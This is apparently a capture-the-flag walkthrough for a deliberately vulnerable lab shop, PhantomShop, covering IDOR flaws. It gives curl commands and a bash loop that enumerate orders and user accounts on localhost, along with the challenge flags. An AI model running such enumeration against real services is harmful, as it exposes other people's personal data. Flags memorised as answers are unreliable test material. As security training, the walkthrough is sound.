# IDOR / Access Control — PhantomShop Walkthroughs

## 1. Order Access (Easy — 100pts)
**Flag:** `FLAG{1d0r_0rd3r_4cc3ss}`
**Location:** `/order/`

### Solution
Your orders are #1001 and #1002. Try other order IDs:
```
http://localhost:8080/order/1337
```
No authorization check — any user can view any order.

### API version
```bash
curl http://localhost:8080/api/order/1337
# Returns order data including the flag
```

---

## 2. Profile Viewing (Easy — 100pts)
**Flag:** `FLAG{1d0r_pr0f1l3_l34k}`
**Location:** `/profile?id=` and `/api/user/`

### Solution
```
http://localhost:8080/profile?id=1   # View admin profile
http://localhost:8080/api/user/1     # API returns admin data + flag
```

### Enumeration
```bash
for i in $(seq 1 10); do
  curl -s "http://localhost:8080/api/user/$i" 2>/dev/null
  echo
done
```

---

## 3. API IDOR — No Auth Check (Medium — 200pts)
**Flag:** `FLAG{1d0r_pr0f1l3_l34k}` (same endpoint)
**Location:** `/api/user/{id}`

### Vulnerability
The API returns any user's data without checking authorization:
```bash
curl http://localhost:8080/api/user/1
# {"id":1,"username":"admin","email":"admin@phantomshop.com","role":"admin","flag":"FLAG{...}"}
```

### Real-world impact
Attackers enumerate all user accounts, extract emails, roles, and sensitive data.
